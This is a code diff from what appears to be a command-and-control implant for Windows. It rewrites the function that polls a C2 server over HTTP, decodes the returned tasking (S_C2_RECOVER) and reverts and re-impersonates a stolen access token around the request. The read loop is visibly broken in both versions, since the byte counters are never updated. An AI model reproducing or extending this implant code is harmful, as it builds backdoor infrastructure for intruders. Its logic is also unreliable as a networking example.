@@ -108,8 +108,11 @@ BOOL NetworkCheckResponse(HINTERNET hInternet)
 	return atoi(status) == HTTP_STATUS_OK;
 }
 
-int NetworkGetInternal(const char* uri, SESSION* session, char* data, const int maxGet)
+int NetworkGet(const char* getUri, SESSION* session, char* data, const int maxGet)
 {
+	IdentityRevertToken();
+
+	const char* uri = getUri;
 #define MAX_URI 0x400
 #define MAX_READ 0x1000
 	TRANSFORM transform;
@@ -143,56 +146,30 @@ int NetworkGetInternal(const char* uri, SESSION* session, char* data, const int 
 	HttpSendRequestA(hInternet, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength);
 	TransformDestroy(&transform);
 
-	if(!NetworkCheckResponse(hInternet))
-	{
-		InternetCloseHandle(hInternet);
-		return -1;
-	}
-
+	int result = -1;
 	DWORD bytesAvailable = 0;
-	if(!InternetQueryDataAvailable(hInternet, &bytesAvailable, 0, 0))
+	if(NetworkCheckResponse(hInternet) && InternetQueryDataAvailable(hInternet, &bytesAvailable, 0, 0) && bytesAvailable < maxGet)
 	{
-		InternetCloseHandle(hInternet);
-		return -1;
-	}
-
-	if (bytesAvailable >= maxGet)
-	{
-		InternetCloseHandle(hInternet);
-		return -1;
-	}
-
-	if(bytesAvailable == 0)
-	{
-		InternetCloseHandle(hInternet);
-		return 0;
-	}
-
-	if(maxGet == 0)
-	{
-		InternetCloseHandle(hInternet);
-		return -1;
-	}
-
-	int totalBytesRead = 0;
-	int bytesRead = 0;
-	do
-	{
-		if(!InternetReadFile(hInternet, data + totalBytesRead, MAX_READ, &bytesAvailable) || bytesRead == 0)
+		if (bytesAvailable == 0)
+			result = 0;
+		else if (maxGet != 0)
 		{
-			InternetCloseHandle(hInternet);
-			return TransformDecode(S_C2_RECOVER, data, totalBytesRead, maxGet);
+			int totalBytesRead = 0;
+			int bytesRead = 0;
+			do
+			{
+				if (!InternetReadFile(hInternet, data + totalBytesRead, MAX_READ, &bytesAvailable) || bytesRead == 0)
+				{
+					InternetCloseHandle(hInternet);
+					result = TransformDecode(S_C2_RECOVER, data, totalBytesRead, maxGet);
+					IdentityImpersonateToken();
+					return result;
+				}
+			}
+			while (totalBytesRead < maxGet);
 		}
-	} while (totalBytesRead < maxGet);
-
+	}
 	InternetCloseHandle(hInternet);
-	return -1;
-}
-
-int NetworkGet(const char* getUri, SESSION* session, char* data, const int maxGet)
-{
-	IdentityRevertToken();
-	int result = NetworkGetInternal(getUri, session, data, maxGet);
 	IdentityImpersonateToken();
 	return result;
 }
